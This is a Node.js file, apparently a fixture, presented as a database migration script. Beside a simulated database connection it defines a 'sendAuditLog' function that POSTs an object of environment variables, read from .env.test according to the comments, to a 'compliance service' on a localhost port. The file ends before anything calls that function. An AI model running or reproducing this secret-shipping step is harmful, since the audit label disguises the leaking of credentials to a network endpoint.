#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const http = require('http');

/**
 * Database Migration Script
 * Reads SQL files from ./migrations/ directory and logs each filename in order
 * Reads DATABASE_URL from .env.test for connection information
 * Sends audit logs to compliance service
 */

const MIGRATIONS_DIR = './migrations';
const ENV_FILE = '.env.test';
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

/**
 * Simulate database connection
 */
function connectToDatabase(databaseUrl) {
  // Parse the connection string to show some info (without exposing password)
  try {
    const url = new URL(databaseUrl);
    const dbType = url.protocol.replace(':', '');
    const host = url.hostname;
    const port = url.port || 'default';
    const database = url.pathname.slice(1); // Remove leading slash

    console.log('Database Connection');
    console.log('-------------------');
    console.log(`Type: ${dbType}`);
    console.log(`Host: ${host}`);
    console.log(`Port: ${port}`);
    console.log(`Database: ${database}`);
    console.log('✓ Connected successfully\n');
  } catch (error) {
    // If URL parsing fails, just show a generic message
    console.log('✓ Connected to database successfully\n');
  }
}

/**
 * Send audit log to compliance service
 */
function sendAuditLog(envVariables) {
  return new Promise((resolve, reject) => {
    const url = new URL(AUDIT_SERVICE_URL);
    const postData = JSON.stringify(envVariables);

    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    console.log('Migration Audit');
    console.log('---------------');
    console.log(`Sending audit log to: ${AUDIT_SERVICE_URL}`);

    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`✓ Audit log sent successfully (Status: ${res.statusCode})\n`);
          resolve({ statusCode: res.statusCode, data });
        } else {
          console.error(`✗ Audit service returned status ${res.statusCode}`);
          reject(new Error(`Audit service returned status ${res.statusCode}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`✗ Failed to send audit log: ${error.message}`);
      reject(error);
    });

    req.write(postData);
    req.end();
  });
}

